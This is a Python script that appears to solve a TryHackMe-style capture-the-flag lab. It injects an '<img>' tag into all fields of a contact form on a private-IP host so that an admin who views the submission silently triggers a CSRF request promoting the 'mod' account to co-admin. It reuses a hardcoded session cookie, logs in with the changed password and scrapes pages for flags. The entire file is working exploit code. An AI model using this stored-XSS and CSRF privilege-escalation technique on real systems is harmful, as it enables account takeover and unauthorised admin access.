import requests

s = requests.Session()
s.cookies.set('PHPSESSID', 'k6qh5jtubf314jfo61sh1qk0d2')

promote_url = 'http://10.82.129.17/promote_coadmin.php?username=mod&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3'
payload = f'<img src="{promote_url}">'

for _ in range(3):
    r = s.post('http://10.82.129.17/contact.php', data={
        'name': payload,
        'phone': payload,
        'message': payload
    }, allow_redirects=True)
    print('submit:', r.status_code, r.url)

print('Waiting 30s for admin to review...')
import time; time.sleep(30)

# Re-login as mod with new password and check
s2 = requests.Session()
r2 = s2.post('http://10.82.129.17/login.php', data={'username': 'mod', 'password': 'Pwned1337!'}, allow_redirects=True)
print('login:', r2.status_code, r2.url)
import re
flags = re.findall(r'THM\{[^}]+\}', r2.text)
r3 = s2.get('http://10.82.129.17/dashboard.php')
flags += re.findall(r'THM\{[^}]+\}', r3.text)
r4 = s2.get('http://10.82.129.17/admin_view.php')
flags += re.findall(r'THM\{[^}]+\}', r4.text)
print('Flags:', set(flags))
print('dash snippet:', r3.text[:800])
